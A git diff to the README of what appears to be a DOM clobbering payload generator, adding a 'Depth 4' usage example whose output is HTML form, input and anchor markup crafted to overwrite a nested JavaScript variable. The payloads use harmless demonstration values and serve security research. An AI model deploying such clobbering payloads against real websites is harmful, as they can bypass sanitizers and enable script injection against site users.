@@ -4,6 +4,8 @@ Full article on [OffensiveWeb](https://www.offensiveweb.com/docs/topics/dom-clob
 
 ## Usage
 
+## Depth 2
+
 ```bash
 $ python3 generator.py video.lang 'Hello!'
 ********************* INFO **********************
@@ -27,6 +29,24 @@ chrome_required = True
 <iframe name="video" lang="Hello!"></iframe>
 ******************** PAYLOAD #7 ********************
 <a id="video"></a><a id="video" name="lang" href="a:Hello!"></a>
+```
+
+## Depth 4
+
+```bash
+$ python3 generator.py music.metadata.sound.max '100%'
+********************* INFO **********************
+ALLOWED_ELEMENTS = ['a', 'form', 'input', 'iframe']
+variable_name = 'music.metadata.sound.max'
+variable_value = '100%'
+depth = 4
+document_scope = False
+chrome_required = True
+******************** PAYLOAD #1 ********************
+<form id="music" name="metadata">
+    <input id="sound" max="100%">
+</form>
+<form id="music">
 ```
 
 ## attributes.json 
